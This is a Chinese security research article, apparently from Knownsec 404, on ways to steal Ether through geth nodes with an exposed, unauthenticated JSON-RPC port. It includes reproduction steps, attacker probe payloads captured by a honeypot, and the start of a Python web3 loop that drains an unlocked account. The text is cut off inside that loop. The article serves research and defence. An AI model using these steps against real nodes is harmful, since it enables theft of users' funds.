> 原文链接: https://www.anquanke.com//post/id/153705 


# 金钱难寐，大盗独行——以太坊 JSON-RPC 接口多种盗币手法大揭秘


                                阅读量   
                                **247651**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t0133a64df80e7baa74.jpg)](https://p5.ssl.qhimg.com/t0133a64df80e7baa74.jpg)



## 0x00 前言

2010年，Laszlo 使用 10000 个比特币购买了两张价值25美元的披萨被认为是比特币在现实世界中的第一笔交易。

2017年，区块链技术随着数字货币的价格暴涨而站在风口之上。谁也不会想到，2010年的那两块披萨，能够在2017年末价值 1.9亿美元。

以太坊，作为区块链2.0时代的代表，通过智能合约平台，解决比特币拓展性不足的问题，在金融行业有了巨大的应用。

通过智能合约进行交易，不用管交易时间，不用管交易是否合法，只要能够符合智能合约的规则，就可以进行无限制的交易。<br>
在巨大的经济利益下，总会有人走上另一条道路。

古人的盗亦有道，在虚拟货币领域也有着它独特的定义。只有对区块链技术足够了解，才能在这场盛宴中 偷 到足够多的金钱。他们似那黑暗中独行的狼，无论是否得手都会在被发现前抽身而去。

2018/03/21,在 [《揭秘以太坊中潜伏多年的“偷渡”漏洞，全球黑客正在疯狂偷币》[19]](https://paper.seebug.org/547/) 和 [《以太坊生态缺陷导致的一起亿级代币盗窃大案》[20]](https://mp.weixin.qq.com/s/Kk2lsoQ1679Gda56Ec-zJg) 两文揭秘 以太坊偷渡漏洞（又称为以太坊黑色情人节事件） 相关攻击细节后，知道创宇404团队根据已有信息进一步完善了相关蜜罐。

2018/05/16,知道创宇404区块链安全研究团队对 偷渡漏洞 事件进行预警并指出该端口已存在密集的扫描行为。

2018/06/29, 慢雾社区 里预警了 以太坊黑色情人节事件（即偷渡漏洞） 新型攻击手法，该攻击手法在本文中亦称之为：离线攻击。在结合蜜罐数据复现该攻击手法的过程中，知道创宇404区块链安全研究团队发现：在真实场景中，还存在 另外两种 新型的攻击方式： 重放攻击 和 爆破攻击，由于此类攻击方式出现在 偷渡漏洞 曝光后，我们将这些攻击手法统一称为 后偷渡时代的盗币方式。

本文将会在介绍相关知识点后，针对 偷渡漏洞 及 后偷渡时代的盗币方式，模拟复现盗币的实际流程，对攻击成功的关键点进行分析。



## 0x01 关键知识点

所谓磨刀不误砍柴功，只有清楚地掌握了关键知识点，才能在理解漏洞原理时游刃有余。在本节，笔者将会介绍以太坊发起一笔交易的签名流程及相关知识点。

### 1.1 RLP 编码

> RLP (递归长度前缀)提供了一种适用于任意二进制数据数组的编码，RLP已经成为以太坊中对对象进行序列化的主要编码方式。

RLP 编码会对字符串和列表进行序列化操作，具体的编码流程如下图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/de3c7f55-9d4a-4d6c-9bd1-d8feab22bbb0.png-w331s)

在此，也以 3.4.1节 中 eth_signTransaction 接口返回的签名数据为例，解释该签名数据是如何经过 tx 编码后得到的。

```
result 字段中的 raw 和 tx 如下：
"raw": "f86b01832dc6c083030d4094d4f0ad3896f78e133f7841c3a6de11be0427ed89881bc16d674ec80000801ba0e2e7162ae34fa7b2ca7c3434e120e8c07a7e94a38986776f06dcd865112a2663a004591ab78117f4e8b911d65ba6eb0ce34d117358a91119d8ddb058d003334ba4
"

"tx": `{`
        "nonce": "0x1",
        "gasPrice": "0x2dc6c0",
        "gas": "0x30d40",
        "to": "0xd4f0ad3896f78e133f7841c3a6de11be0427ed89",
        "value": "0x1bc16d674ec80000",
        "input": "0x",
        "v": "0x1b",
        "r": "0xe2e7162ae34fa7b2ca7c3434e120e8c07a7e94a38986776f06dcd865112a2663",
        "s": "0x4591ab78117f4e8b911d65ba6eb0ce34d117358a91119d8ddb058d003334ba4",
        "hash": "0x4c661b558a6a2325aa36c5ce42ece7e3cce0904807a5af8e233083c556fbdebc"
`}`
```

根据 RLP 编码的规则，我们对 tx 字段当作一个列表按顺序进行编码(hash除外)。由于长度必定大于55字节，所以采用最后一种编码方式。

暂且先抛开前两位，对所有项进行RLP编码，结果如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/31a4f956-2d40-4231-a272-a58e4fbb72f9.png-w331s)

合并起来就是：

```
01832dc6c083030d4094d4f0ad3896f78e133f7841c3a6de11be0427ed89881bc16d674ec80000801ba0e2e7162ae34fa7b2ca7c3434e120e8c07a7e94a38986776f06dcd865112a2663a004591ab78117f4e8b911d65ba6eb0ce34d117358a91119d8ddb058d003334ba4
```

一共是 214 位，长度是 107 比特，也就意味着第二位是 0x6b，第一位是 0xf7 + len(0x6b) = 0xf8,这也是最终 raw 的内容：

```
0xf86b01832dc6c083030d4094d4f0ad3896f78e133f7841c3a6de11be0427ed89881bc16d674ec80000801ba0e2e7162ae34fa7b2ca7c3434e120e8c07a7e94a38986776f06dcd865112a2663a004591ab78117f4e8b911d65ba6eb0ce34d117358a91119d8ddb058d003334ba4
```

### 1.2 keystore 文件及其解密

keystore 文件用于存储以太坊私钥。为了避免私钥明文存储导致泄漏的情况发生，keystore 文件应运而生。让我们结合下文中的 keystore 文件内容来看一下私钥是被如何加密的：

```
keystore文件来源：https://github.com/ethereum/tests/blob/2bb0c3da3bbb15c528bcef2a7e5ac4bd73f81f87/KeyStoreTests/basic_tests.json，略有改动
`{`
    "address": "0x008aeeda4d805471df9b2a5b0f38a0c3bcba786b",
    "crypto" : `{`
        "cipher" : "aes-128-ctr",
        "cipherparams" : `{`
            "iv" : "83dbcc02d8ccb40e466191a123791e0e"
        `}`,
        "ciphertext" : "d172bf743a674da9cdad04534d56926ef8358534d458fffccd4e6ad2fbde479c",
        "kdf" : "scrypt",
        "kdfparams" : `{`
            "dklen" : 32,
            "n" : 262144,
            "r" : 1,
            "p" : 8,
            "salt" : "ab0c7876052600dd703518d6fc3fe8984592145b591fc8fb5c6d43190334ba19"
        `}`,
        "mac" : "2103ac29920d71da29f15d75b4a16dbe95cfd7ff8faea1056c33131d846e3097"
    `}`,
    "id" : "3198bc9c-6672-5ab3-d995-4942343ae5b6",
    "version" : 3
`}`
```

在此，我将结合私钥的加密过程说明各字段的意义：

加密步骤一：使用aes-128-ctr对以太坊账户的私钥进行加密

本节开头已经说到，keystore 文件是为了避免私钥明文存储导致泄漏的情况发生而出现的，所以加密的第一步就是对以太坊账户的私钥进行加密。这里使用了 aes-128-ctr 方式进行加密。设置 解密密钥和 初始化向量iv 就可以对以太坊账户的私钥进行加密，得到加密后的密文。

keystore 文件中的cipher、cipherparams、ciphertext参数与该加密步骤有关：
- cipher: 表示对以太坊账户私钥加密的方式，这里使用的是 aes-128-ctr
- cipherparams 中的 iv: 表示使用 aes 加密使用的初始化向量 iv
- ciphertext: 表示经过加密后得到的密文
加密步骤二：利用kdf算法计算解密密钥

经过加密步骤一，以太坊账户的私钥已经被成功加密。我们只需要记住 解密密钥 就可以进行解密，但这里又出现了一个新的问题，解密密钥 长达32位且毫无规律可言。所以以太坊又使用了一个 密钥导出函数(kdf) 计算解密密钥。在这个 keystore 文件中，根据 kdf 参数可以知道使用的是 scrypt 算法。最终实现的效果就是：对我们设置的密码与 kdfparams 中的参数进行 scrypt 计算，就会得到 加密步骤1 中设置的 解密密钥.

keystore 文件中的 kdf、kdfparams 参数与该加密步骤有关：
- kdf: 表示使用的 密钥导出函数 的具体算法
- kdfparams: 使用密钥导出函数需要的参数
加密步骤三：验证用户密码的正确性

假设用户输入了正确的密码，只需要通过步骤一二进行解密就可以得到正确的私钥。但我们不能保证用户每次输入的密码都是正确的。所以引入了验算的操作。验算的操作十分简单，取步骤二解密出的密钥的第十七到三十二位和 ciphertext 进行拼接，计算出该字符串的 sha3_256 的值。如果和 mac 的内容相同，则说明密码正确。

keystore 文件中的 mac 参数与该步骤有关：
- mac: 用于验证用户输入密码的正确性。
综上所述，要从 keystore 文件中解密出私钥，所需的步骤是：
1. 通过 kdf 算法生成解密私钥
1. 对解密私钥进行验算，如果与 mac 值相同，则说明用户输入的密码正确。
1. 利用解密私钥解密ciphertext，获得以太坊账户的私钥
流程图如下：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/87124612-62cc-42de-954d-f1f0c013bb09.png-w331s)

如果有读者想通过编程实现从 keystore 文件中恢复出私钥，可以参考[How do I get the raw private key from my Mist keystore file?[15]](https://ethereum.stackexchange.com/questions/3720/how-do-i-get-the-raw-private-key-from-my-mist-keystore-file)中的最后一个回答。

其中有以下几点注意事项：
1. 需要的环境是 Python 3.6+ OpenSSL 1.1+
1. 该回答在 Decrypting with the derived key 中未交代 key 参数的来历，实际上 key = dec_key[:16]
### 1.3 以太坊交易的流程

根据源码以及网上已有的资料，笔者总结以太坊的交易流程如下：
1. 用户发起转账请求。
1. 以太坊对转账信息进行签名
1. 校验签名后的信息并将信息加入交易缓存池(txpool)
1. 从交易缓存池中提取交易信息进行广播
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/e6ff7fdc-88fc-4d98-8568-cebe118f22f4.png-w331s)

对于本文来说，步骤2：以太坊对转账信息进行签名对于理解 3.4节 利用离线漏洞进行攻击 十分重要。笔者也将会着重分析该步骤的具体实现。

从上文中我们可以知道，私钥已经被加密在 keystore 文件中，所以在步骤2进行签名操作之前，需要将私钥解密出来。在以太坊的操作中有专门的接口用于解锁账户： personal.unlockAccount

在解锁对应的账户后，我们将可以进行转账操作。在用私钥进行签名前，存在一些初始化操作：
- 寻找 from 参数对应地址的钱包
- 判断必须传入的参数是否正确
- 将传入的参数和原本的设置参数打包成 Transaction 结构体
这里可以注意一点：Transaction 结构体中是不存在 from 字段的。这里不添加 from 字段和后面的签名算法有着密切的关系。

使用私钥对交易信息进行签名主要分为两步：
1. 对构造的列表进行 RLP 编码，然后通过 sha3_256 计算出编码后字符串的 hash 值。
1. 使用私钥对 hash 进行签名，得到一串 65 字节长的结果，从中分别取出 r、s、v
根据椭圆加密算法的特点，我们可以根据 r、s、v 和 hash 算出对应的公钥。

由于以太坊的地址是公钥去除第一个比特后经过 sha3_256 加密的后40位，所以在交易信息中不包含 from 的情况下，我们依旧可以知道这笔交易来自于哪个地址。这也是前文说到 Transaction 结构体中不存在 from 的原因。

在签名完成后，将会被添加进交易缓存池(txpool)，在这个操作中，from 将会被还原出来，并进行一定的校验操作。同时也考虑到交易缓存池的各种极端情况，例如：在交易缓存池已满的情况下，会将金额最低的交易从缓存池中移除。

最终，交易缓存池中存储的交易会进行广播，网络中各节点收到该交易后都会将该交易存入交易缓存池。当某节点挖到新的区块时，将会从交易缓存池中按照 gasPrice 高低排序交易并打包进区块。



## 0x02 黑暗中的盗币方式：偷渡时代

### 2.1 攻击流程复现

攻击复现环境位于 ropsten 测试网络。

被攻击者IP: 10.0.0.2 ，启动客户端命令为：geth –testnet –rpc –rpcapi eth –rpcaddr 0.0.0.0 console 账户地址为：0x6c047d734ee0c0a11d04e12adf5cce4b31da3921,剩余余额为 5 ether

攻击者IP: 10.0.0.3 , 账户地址为 0xda0b72478ed8abd676c603364f3105233068bdad

注：若读者要在公链、测试网络实践该部分内容，建议先阅读 3.2 节的内容，了解该部分可能存在的隐藏问题。

攻击者步骤如下：
<li>攻击者通过端口扫描等方式发现被攻击者开放了 JSON-RPC 端口后，调用 eth_getBlockByNumber eth_accounts 接口查询当前节点最新的区块高度以及该节点上已有的账户。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/92aa113f-9c71-417d-97cf-6747291eae76.png-w331s)
</li>
<li>攻击者调用 eth_getBalance 接口查询当前节点上所有账户的余额。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/197591a7-d72b-4445-9f9b-cf5950f9cff8.png-w331s)
</li>
<li>攻击者对存在余额的账户持续发起转账请求。[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/d46a1b82-b83d-4aa3-a706-cddf00ba3ea4.png-w331s)
</li>
一段时间后，被攻击者需要进行交易：

按照之前的知识点，用户需要先解锁账户然后才能转账。当我们使用 personal.unlockAccount 和密码解锁账户后，就可以在终端看到恶意攻击者已经成功发起交易。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/c9a4467a-e9d9-4684-8671-fc132d400c6c.png-w331s)

读者可以通过该[链接](https://ropsten.etherscan.io/tx/0x4ad68aafc59f18a11c0ea6e25588d296d52f04edd969d5674a82dfd4093634f6)看到恶意攻击者的交易信息。

攻击的流程图如下所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/2893ccdf-de47-4d76-9b5b-8f7e656fc940.png-w331s)

### 2.2 攻击成功的关键点解析

看完 2.1 节 偷渡漏洞 攻击流程，你可能会有这样的疑问：
1. 攻击者为什么可以转账成功？
1. 如例子中所示，该地址只有 5 ether，一次被转走了 4.79 ether，如果我们解锁账户后在被攻击前发起转账，转走 1 ether，是否攻击者就不会攻击成功？
下文将详细分析这两个问题并给出答案。

#### 2.2.1 攻击者可以通过 rpc 接口转账的原因

首先，分析一下关键的 unlockAccount 函数:

```
func (s *PrivateAccountAPI) UnlockAccount(addr common.Address, password string, duration *uint64) (bool, error) `{`
    const max = uint64(time.Duration(math.MaxInt64) / time.Second)
    var d time.Duration
    if duration == nil `{`
        d = 300 * time.Second
    `}` else if *duration &gt; max `{`
        return false, errors.New("unlock duration too large")
    `}` else `{`
        d = time.Duration(*duration) * time.Second
    `}`
    err := fetchKeystore(s.am).TimedUnlock(accounts.Account`{`Address: addr`}`, password, d)
    return err == nil, err
`}`
```

在判断传入的解锁时间是否为空、是否大于最大值后，调用 TimedUnlock() 进行解锁账户的操作，而 TimedUnlock() 的代码如下：

```
func (ks *KeyStore) TimedUnlock(a accounts.Account, passphrase string, timeout time.Duration) error `{`
    a, key, err := ks.getDecryptedKey(a, passphrase)
    if err != nil `{`
        return err
    `}`

    ks.mu.Lock()
    defer ks.mu.Unlock()
    u, found := ks.unlocked[a.Address]
    if found `{`
        if u.abort == nil `{`
            // The address was unlocked indefinitely, so unlocking
            // it with a timeout would be confusing.
            zeroKey(key.PrivateKey)
            return nil
        `}`
        // Terminate the expire goroutine and replace it below.
        close(u.abort)
    `}`
    if timeout &gt; 0 `{`
        u = &amp;unlocked`{`Key: key, abort: make(chan struct`{``}`)`}`
        go ks.expire(a.Address, u, timeout)
    `}` else `{`
        u = &amp;unlocked`{`Key: key`}`
    `}`
    ks.unlocked[a.Address] = u
    return nil
`}`
```

首先通过 getDecryptedKey() 从 keystore 文件夹下的文件中解密出私钥（具体的解密过程可以参考 1.2 节的内容），再判断该账户是否已经被解锁，如果没有被解锁，则将解密出的私钥存入名为 unlocked 的 map 中。如果设置了解锁时间，则启动一个协程进行超时处理 go ks.expire().

再看向实现转账的函数的实现过程 SendTransaction() -&gt; wallet.SignTx() -&gt; w.keystore.SignTx()：

```
func (s *PublicTransactionPoolAPI) SendTransaction(ctx context.Context, args SendTxArgs) (common.Hash, error) `{`

    account := accounts.Account`{`Address: args.From`}`

    wallet, err := s.b.AccountManager().Find(account)

    ......

    tx := args.toTransaction()

    ......

    signed, err := wallet.SignTx(account, tx, chainID)

    return submitTransaction(ctx, s.b, signed)
`}`

func (w *keystoreWallet) SignTx(account accounts.Account, tx *types.Transaction, chainID *big.Int) (*types.Transaction, error) `{`

    ......

    return w.keystore.SignTx(account, tx, chainID)
`}`

func (ks *KeyStore) SignTx(a accounts.Account, tx *types.Transaction, chainID *big.Int) (*types.Transaction, error) `{`
    // Look up the key to sign with and abort if it cannot be found
    ks.mu.RLock()
    defer ks.mu.RUnlock()

    unlockedKey, found := ks.unlocked[a.Address]
    if !found `{`
        return nil, ErrLocked
    `}`
    // Depending on the presence of the chain ID, sign with EIP155 or homestead
    if chainID != nil `{`
        return types.SignTx(tx, types.NewEIP155Signer(chainID), unlockedKey.PrivateKey)
    `}`
    return types.SignTx(tx, types.HomesteadSigner`{``}`, unlockedKey.PrivateKey)
`}`
```

可以看到，在 w.keystore.SignTx() 中，直接从 ks.unlocked 中取出对应的私钥。这也就意味着如果执行了 unlockAccount() 函数、没有超时的话，从 ipc、rpc调用 SendTransaction() 都会成功签名相关交易。

由于默认参数启动的 Go-Ethereum 设计上并没有对 ipc、rpc 接口添加相应的鉴权模式，也没有在上述的代码中对请求用户的身份进行判断，最终导致攻击者可以在用户解锁账号的时候完成转账操作，偷渡漏洞利用成功。

#### 2.2.2 攻击者和用户竞争转账的问题

由于用户解锁账户的目的是为了转账，所以存在用户和攻击者几乎同时发起了交易的情况，在这种情况下，攻击者是如何保证其攻击的成功率呢？

在攻击者账号[0x957cD4Ff9b3894FC78b5134A8DC72b032fFbC464](https://etherscan.io/txs?a=0x957cD4Ff9b3894FC78b5134A8DC72b032fFbC464)的交易记录中，交易[0x8ec46c3054434fe00155bb2d7e36d59f35d0ae1527aa5da8ec6721b800ec3aa2](https://etherscan.io/tx/0x8ec46c3054434fe00155bb2d7e36d59f35d0ae1527aa5da8ec6721b800ec3aa2)能够很好地解释该问题。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/55bf2f13-d235-4e88-9eab-619f12be75e7.png-w331s)

相较于目前主流的 gasPrice 维持在 1 Gwei，该笔交易的 gasPrice 达到了惊人的 1,149,246 Gwei。根据 1.3节 中介绍的以太坊交易流程可知：
1. 在交易签名完成后，交易就会被存入交易缓存池(txpool)，交易会被进行校验。但是由于此时新的交易还没有打包进区块，所以用户和攻击者发起的交易都会存入交易缓存池并广播出去。
1. 当某节点挖到新的区块时，会将交易从交易缓存池中按照 gasPrice 高低进行排序取出并打包。gasPrice 高的将会优先被打包进区块。由于攻击者的交易的 gasPrice 足够高，所以会被优先被打包进区块，而用户的交易将会由于余额不足导致失败。这是以太坊保证矿工利益最大化所设计的策略，也为攻击者攻击快速成功提供了便利。
也正是由于较高的 gasPrice,使得该攻击者在与其它攻击者的竞争中（有兴趣的可以看看上图红框下方两笔 dropped Txns）得到这笔 巨款。

### 2.3 蜜罐捕获数据

该部分数据截止 2018/03/21

在 偷渡漏洞 被曝光后，知道创宇404团队在已有的蜜罐数据中寻找到部分攻击的痕迹。

下图是 2017/10/01 到 2018/03/21 间蜜罐监控到的相关攻击情况：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/d0a591f1-8a45-4122-a00e-3bacdd710db9.png-w331s)

被攻击端口主要是 8545端口，8546、10332、8555、18082、8585端口等也有少量扫描痕迹。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/f461145f-6b2d-4882-a40e-28c4ac35af5d.jpeg-w331s)

攻击来源IP主要集中在 46.166.148.120/196 和 216.158.238.178/186/226 上：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/26f614b2-4705-4b15-8ee4-71eb4a2f53be.png-w331s)

46.166.148.120/196 攻击者使用的探测 payload 主要是:

```
`{`"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x1", false], "id":309900`}`
```

216.158.238.178/186/226 攻击者使用的探测 payload 主要是:

```
`{`"id":0,"jsonrpc":"2.0","method":"eth_accounts"`}`
```



## 0x03 后偷渡时代的盗币方式

> 在偷渡漏洞被曝光后，攻击者和防御者都有所行动。根据我们蜜罐系统捕获的数据，在后偷渡时代，攻击的形式趋于多样化，利用的以太坊特性越来越多，攻击方式趋于完善。部分攻击甚至可以绕过针对偷渡漏洞的防御方式，所以在说这些攻击方式前，让我们从偷渡漏洞的防御修复方式开篇。

### 3.1 偷渡漏洞的已知的防范、修复方式

在参考链接 [10](https://github.com/ethereum/go-ethereum/issues/15953)、[19](https://paper.seebug.org/547/)、[20](https://mp.weixin.qq.com/s/Kk2lsoQ1679Gda56Ec-zJg) 中，关于偷渡漏洞的防范、修复方式有：
- 使用 personal.sendTransaction 功能进行转账，而不是使用 personal.unlockAccount 和 eth.sendTransaction 进行转账。
- 更改默认的 RPC API 端口、更改 RPC API 监听地址为内网、配置 iptables 限制对 RPC API 端口的访问、账户信息（keystore）不存放在节点上、转账使用 web3 的 sendTransaction 和 sendRawTransaction 发送私钥签名过的 transaction、私钥物理隔离（如冷钱包、手工抄写）或者高强度加密存储并保障密钥的安全
- 关闭对外暴露的RPC端口，如果必须暴露在互联网，使用鉴权[链接地址](https://tokenmarket.net/blog/protecting-ethereum-json-rpc-api-with-password/)、借助防火墙等网络防护软件，封堵黑客攻击源IP、检查RPC日志、web接口日志、等待以太坊更新最新代码，使用修复了该漏洞的节点程序
但是实际的情况却是 关闭对公网暴露的 RPC 接口 、使用 personal.sendTransaction()进行转账 或 节点上不存放账户信息(keystore) 后，依然可能会被盗币。根据上文，模拟出如下两种情景：

情景一：对于曾经被盗币，修复方案仅为：关闭对公网暴露的 RPC 接口，关闭后继续使用节点中相关账户或移除了账户信息(keystore)的节点，可能会受到 Geth 交易缓存池的重放攻击 和 离线漏洞 的攻击。

情景二：对于暂时无法关闭对公网暴露的 RPC 接口，却使用 personal.sendTransaction() 安全转账的节点，可能会受到 爆破账号密码 的攻击。

我们也将会在 3.2节 – 3.5节 详细的说明这三种漏洞的攻击流程。

### 3.2 交易缓存池的重放攻击

> 对于曾经被盗币，修复方案仅为：关闭对公网暴露的 RPC 接口，关闭后继续使用节点中相关账户的节点，可能会受到该攻击

#### 3.2.1 发现经历

细心的读者也许会发现，在 2.1节 中，为了实现攻击者不停的发送转账请求的功能，笔者使用了 while True 循环，并且在 geth 终端中看到了多条成功签名的交易 hash。由于交易缓存池拥有一定的校验机制，所以除了第一笔交易[0x4ad68aafc59f18a11c0ea6e25588d296d52f04edd969d5674a82dfd4093634f6](https://ropsten.etherscan.io/tx/0x4ad68aafc59f18a11c0ea6e25588d296d52f04edd969d5674a82dfd4093634f6)外，剩下的交易应该因为账户余额不足而被移出交易缓存池。

但是在测试网络中却出现了截然不同的情况，在我们关闭本地的 geth 客户端后，应该被移出交易缓存池的交易在余额足够的情况下会再次出现并交易成功：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/c539999d-5f5e-4d52-87f4-b812eda6561f.png-w331s)

（为了避免该现象的出现，在 2.1节 中，可以在成功转账之后利用 break 终止相关的循环）

这个交易奇怪的地方在于：在账户余额不足的情况下，查找不到任何 Pendding Transactions：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/8c0376db-a4c4-4bd4-964d-7ec741c94b5b.png-w331s)

当账户余额足够支付时，被移出交易缓存池的交易会重新出现，并且是 Pendding 状态。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/41e56b58-06e9-4f11-a179-43c7f7d6f06c.png-w331s)

在部分 pendding 的交易完成后，剩余的交易将会继续消失。

这也就意味着，如果攻击者能够在利用 偷渡漏洞 的过程中，在交易被打包进区块，账号状态发生改变前发送大量的交易信息，第一条交易会被立即实行，剩余的交易会在 受害人账号余额 大于 转账金额+gas消耗的金额 的时候继续交易，而且这个交易信息在大多数情况下不会被查到。

对于这个问题进行分析研究后，我们认为可能的原因是：以太坊在同步交易缓存池的过程中可能因为网络波动、分布式的特点等原因，导致部分交易多次进入交易缓存池。这也导致 部分应该被移出交易缓存池的交易 多次重复进入交易缓存池。

具体的攻击流程如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/76a0962f-f1e5-4a78-82c1-c9f124433ca9.png-w331s)

#### 3.2.2 本地复现过程

> 关于 3.2.1 节中出现的现象，笔者进行了多方面的猜测。最终在低版本的 geth 中模拟复现了该问题。但由于现实环境的复杂性和不可控性，并不能确定该模拟过程就是造成该现象的最终原因，故该本地复现流程仅供参考。

攻击复现环境位于私链中，私链挖矿难度设置为 0x400000，保证在挖出区块之前拥有足够的时间检查各节点的交易缓存池。geth的版本为 1.5.0。

被攻击者的节点A：通过 geth –networkid 233 –nodiscover –verbosity 6 –ipcdisable –datadir data0 –rpc –rpcaddr 0.0.0.0 console 启动。

矿机节点B，负责挖矿： 通过 geth –networkid 233 –nodiscover –verbosity 6 –ipcdisable –datadir data0 –port 30304 –rpc –rpcport 8546 console 启动并在终端输入 miner.start(1)，使用单线程进行挖矿。

存在问题的节点C：通过 geth –networkid 233 –nodiscover –verbosity 6 –ipcdisable –datadir data0 –port 30305 –rpc –rpcport 8547 console 启动。

各节点启动后通过 admin.nodeInfo 和 admin.addPeer() 相互添加节点。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/7fe48419-4e4b-4ecb-acc7-647373c964de.png-w331s)

1.攻击者扫描到被攻击节点A开放了rpc端口，使用如下代码开始攻击：

```
import time
from web3 import Web3,HTTPProvider
web3 = Web3(HTTPProvider("http://172.16.4.128:8545/"))
web3.eth.getBalance(web3.eth.accounts[0])
while True:
